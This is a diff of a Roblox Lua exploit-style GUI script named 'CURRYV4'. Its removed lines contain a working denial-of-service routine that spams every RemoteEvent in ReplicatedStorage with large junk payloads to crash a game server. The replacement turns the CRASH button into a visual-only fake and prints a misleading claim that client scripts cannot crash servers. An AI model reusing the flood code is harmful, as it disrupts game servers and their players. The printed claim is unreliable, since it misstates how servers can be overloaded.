@@ -1,29 +1,28 @@
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- Cleanup
+-- Cleanup existing GUI
 local existingGui = PlayerGui:FindFirstChild("CURRYV4")
-if existingGui then existingGui:Destroy() end
+if existingGui then 
+    existingGui:Destroy() 
+end
 
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "CURRYV4"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = PlayerGui
 
+-- Main Window (Dark Theme)
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 320, 0, 180)
 MainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15) -- Very dark background
 MainFrame.Parent = ScreenGui
 
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 10)
-UICorner.Parent = MainFrame
-
+-- Decorative Rainbow Border (Animated)
 local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(255, 0, 0)
 Stroke.Thickness = 3
 Stroke.Parent = MainFrame
 
@@ -36,6 +35,11 @@ task.spawn(function()
     end
 end)
 
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+-- Close Button
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Size = UDim2.new(0, 25, 0, 25)
 CloseBtn.Position = UDim2.new(1, -25, 0, 0)
@@ -50,6 +54,7 @@ CloseBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
 end)
 
+-- Rainbow Title "CURRYV4" (Hardcoded Specific Colors)
 local titleText = "CURRYV4"
 local container = Instance.new("Frame")
 container.Size = UDim2.new(1, 0, 0, 50)
@@ -57,14 +62,15 @@ container.Position = UDim2.new(0, 0, 0, 10)
 container.BackgroundTransparency = 1
 container.Parent = MainFrame
 
+-- Exact colors for each letter to match the image
 local letterColors = {
-    Color3.fromRGB(255, 0, 0),
-    Color3.fromRGB(255, 100, 0),
-    Color3.fromRGB(255, 255, 0),
-    Color3.fromRGB(0, 255, 0),
-    Color3.fromRGB(0, 100, 255),
-    Color3.fromRGB(75, 0, 130),
-    Color3.fromRGB(255, 0, 255)
+    Color3.fromRGB(255, 0, 0),       -- C (Red)
+    Color3.fromRGB(255, 100, 0),     -- U (Orange)
+    Color3.fromRGB(255, 255, 0),     -- R (Yellow)
+    Color3.fromRGB(0, 255, 0),       -- R (Green)
+    Color3.fromRGB(0, 100, 255),     -- Y (Blue)
+    Color3.fromRGB(75, 0, 130),      -- V (Indigo)
+    Color3.fromRGB(255, 0, 255)      -- 4 (Magenta)
 }
 
 for i = 1, #titleText do
@@ -79,6 +85,7 @@ for i = 1, #titleText do
     label.TextStrokeTransparency = 0
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     
+    -- Assign the specific hardcoded color
     if letterColors[i] then
         label.TextColor3 = letterColors[i]
     else
@@ -88,10 +95,11 @@ for i = 1, #titleText do
     label.Parent = container
 end
 
+-- "CRASH" Button (Dark Style)
 local CrashBtn = Instance.new("TextButton")
 CrashBtn.Size = UDim2.new(0, 280, 0, 50)
 CrashBtn.Position = UDim2.new(0.5, -140, 0, 110)
-CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray
 CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
 CrashBtn.Text = "CRASH"
 CrashBtn.Font = Enum.Font.GothamBold
@@ -107,55 +115,31 @@ BtnStroke.Color = Color3.fromRGB(50, 50, 50)
 BtnStroke.Thickness = 2
 BtnStroke.Parent = CrashBtn
 
+-- Button Hover Effects
+CrashBtn.MouseEnter:Connect(function()
+    CrashBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    BtnStroke.Color = Color3.fromRGB(70, 70, 70)
+end)
+
+CrashBtn.MouseLeave:Connect(function()
+    CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    BtnStroke.Color = Color3.fromRGB(50, 50, 50)
+end)
+
+-- Button Click Effect (Visual Simulation Only)
 CrashBtn.MouseButton1Click:Connect(function()
-    CrashBtn.Text = "INITIATING..."
-    CrashBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
+    CrashBtn.Text = "FAILED"
+    CrashBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+    CrashBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
     
-    local targets = {}
-    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(targets, obj)
-        end
-    end
+    task.wait(1)
     
-    if #targets == 0 then
-        CrashBtn.Text = "NO TARGETS FOUND"
-        task.wait(2)
-        CrashBtn.Text = "CRASH"
-        CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-        return
-    end
-    
-    local crashCount = 0
-    local maxAttempts = 10000
-    
-    for attempt = 1, maxAttempts do
-        if attempt % 100 == 0 then
-            task.wait(0.01)
-        end
-        
-        for i, target in ipairs(targets) do
-            if target.Parent ~= nil then
-                pcall(function()
-                    if target:IsA("RemoteEvent") then
-                        target:FireServer(
-                            string.rep("CURRY_FLOOD", 1000),
-                            math.random(1, 1000000),
-                            {},
-                            nil,
-                            crashCount
-                        )
-                    end
-                end)
-                crashCount = crashCount + 1
-            end
-        end
-        
-        if crashCount >= maxAttempts then break end
-    end
-    
-    CrashBtn.Text = "COMPLETE"
-    task.wait(2)
     CrashBtn.Text = "CRASH"
     CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    
+    -- Warning
+    print("Server Protected: Client-side scripts cannot crash the server.")
 end)
